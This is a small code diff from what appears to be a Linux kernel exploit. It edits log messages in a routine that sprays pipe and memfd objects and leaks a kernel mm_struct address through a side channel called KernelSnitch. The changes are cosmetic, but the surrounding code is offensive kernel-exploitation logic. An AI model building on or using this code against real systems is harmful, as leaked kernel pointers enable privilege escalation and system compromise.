@@ -238,7 +238,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   leaked = cleanup_kernelsnitch();
 #endif
   if (leaked == 0 || leaked == (uintptr_t)-1) {
-    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
+    pr_warning("pipe mm_struct search failed mode=%d\n", MM_SEARCH_MODE);
     close_ctx_memfds(&prep);
     close_ctx_memfds(&spray);
     close_ctx_memfds(&pre);
@@ -253,7 +253,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   if (getenv("KS_LEAK_ONLY")) {
-    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
+    pr_success("mm leak-only mm=%016zx base=%016zx object_index=%zu\n",
                leaked, base, (leaked - base) / MM_STRUCT_SZ);
     fflush(NULL);
     _exit(0);
